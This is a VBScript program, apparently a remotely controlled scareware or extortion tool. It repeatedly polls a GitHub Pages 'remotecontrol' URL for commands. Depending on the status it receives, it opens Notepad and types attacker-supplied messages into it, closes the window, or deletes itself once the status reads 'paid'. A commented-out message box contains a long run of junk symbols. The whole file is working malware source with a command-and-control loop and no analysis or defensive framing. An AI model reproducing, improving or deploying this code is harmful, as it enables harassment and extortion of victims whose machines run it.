Option Explicit
 
Dim url
url = "https://tanjim750.github.io/remotecontrol/"

Dim stuck
stuck = 0

Dim loopCondition
loopCondition = True

Do While loopCondition
    Dim response, status_input, text_input, status_value, text
    Set response = CreateObject("WinHttp.WinHttpRequest.5.1")
	
    On Error Resume Next
    response.open "GET", url, False
	' Add cache-control headers to disable caching
    response.SetRequestHeader "Cache-Control", "no-cache, no-store, must-revalidate"
    response.SetRequestHeader "Pragma", "no-cache"
    response.SetRequestHeader "Expires", "0"
    response.send
	
    
    If Err.Number = 0 Then
		If response.status = 200 Then
			Dim html
			html = response.responseText
        
			Dim htmlDocument
			Set htmlDocument = CreateObject("HTMLFile")
			htmlDocument.write html
			htmlDocument.close
        
			Set status_input = htmlDocument.getElementById("status1")
			Set text_input = htmlDocument.getElementById("text1")
			Dim w_shell
			Set w_shell = CreateObject("WScript.Shell")
		
			If Not status_input Is Nothing Then
				status_value = status_input.value
			End If
        
			If Not text_input Is Nothing Then
            text = text_input.innerText
			End If
		Else

			If stuck = 0 Then
				status_value = "loop"
			ElseIf stuck = 1 Then
				status_value = "pending"
			End If
		End If
	Else

		If stuck = 0 Then
			status_value = "loop"
		ElseIf stuck = 1 Then
			status_value = "pending"
		End If
    End If

    If status_value = "pending" Then
		If stuck = 0 Then
			w_shell.Run "notepad"
			WScript.Sleep 1000
		End If
		
		stuck = 1
		' Send text to Notepad
		w_shell.AppActivate "Notepad"
		w_shell.sendkeys text
		w_shell.Run "rundll32 user32,SetCursorPos 0,0" 
		'MsgBox "!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$$#@#$#!@%$!#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$#!@%$^!%#%#!^$%#!%$^!#%$%#!%@$!@%#$!@#%!@$%!@#%%&^%!^$@%$",vbInformation+ vbSystemModal, text
		


        
    ElseIf status_value = "loop" Then
		If stuck = 1 Then
			stuck = 0
			w_shell.AppActivate "Notepad"
			w_shell.SendKeys "%{F4}"
			w_shell.SendKeys "%{N}"
		End If
		loopCondition = True
        
    ElseIf status_value = "donotexecute" Then
		If stuck = 1 Then
			w_shell.AppActivate "Notepad"
			w_shell.SendKeys "%{F4}"
		End If
        WScript.Quit
        
    ElseIf status_value = "paid" Then
		If stuck = 1 Then
			w_shell.AppActivate "Notepad"
			w_shell.SendKeys "%{F4}"
			w_shell.SendKeys "%{N}"
		End If
        Set objFSO = CreateObject("Scripting.FileSystemObject")

		' Get the path of the current VBScript file
		filePath = WScript.ScriptFullName

		' Delete the file
		objFSO.DeleteFile(filePath)
        WScript.Quit
    Else
        loopCondition = True
    End If
    
Loop
